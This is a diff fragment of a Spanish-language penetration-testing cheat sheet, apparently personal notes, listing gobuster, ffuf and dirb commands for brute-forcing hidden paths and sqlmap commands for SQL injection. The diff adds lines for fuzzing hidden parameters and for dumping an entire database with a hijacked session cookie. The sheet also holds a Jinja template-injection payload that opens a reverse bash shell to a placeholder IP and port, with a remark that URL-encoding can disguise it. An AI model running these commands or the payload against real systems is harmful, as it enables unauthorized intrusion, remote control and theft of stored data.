@@ -47,6 +47,8 @@ gobuster vhost -u http://IP/ -w (RutaDelWorlist) --append-domain [fuerza rutas o
 
 ffuf -w (RutaDeWordlist) -u http://IP/ruta/FUZZ -c -ic -fc 403,404 -e .txt,.zip,.php [Fuerza rutas ocultas usando -w para wordlists, -u para la direccion ip, -c para dar claridad, -ic para ignorar respuestas iguales, -fc para ignorar codigos de estado y -e para encontrar extensiones]
 
+ffuf -u http://IP/archivo.php?FUZZ=parametro -w (RutaDelWorlist) | grep "Status: 200" [Fuerza un parametro oculto que esta en FUFF a traves de una ruta oculta y lo revela con grep]
+
 dirb (ip o url) (RutaDeWordlist) [fuerza rutas ocultas en un sitio web usando una wordlist]
 
 dirb (ip o url) / -u usuario:contraseña [fuerza rutas con credenciales]
@@ -72,6 +74,8 @@ sqlmap -r (archivo.sql) --dbs [ejecuta un ataque de inyección SQL usando una pe
 sqlmap -r (archivo.sql) -D (USUARIOS) --dump-all [extrae y muestra todo el contenido de todas las tablas dentro de la base de datos llamada por ejemplo USUARIOS, usando la petición HTTP del archivo archivo.sql]
 
 sqlmap -u (usuario) -h (ip) -p [El comando usa sqlmap para probar si un parámetro de la URL (especificado con -p) es vulnerable a inyección SQL en un sitio web (indicado con -u)]
+
+sqlmap -u http://IP/ARCHIVO.php?PARAMETRO=admin --cookie="PHPSESSID=valorDeCookie" --dump [extrae y muestra todo el contenido de todas las tablas dentro de la base de datos usando una cookie y el parametro admin a traves de un php que ejecuta codigo]
 
 {% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/IP/PUERTO 0>&1"')}} [si se codifica en url puede actuar como shell reversa disfrazado con plantilla de tipo Jinja] 
 
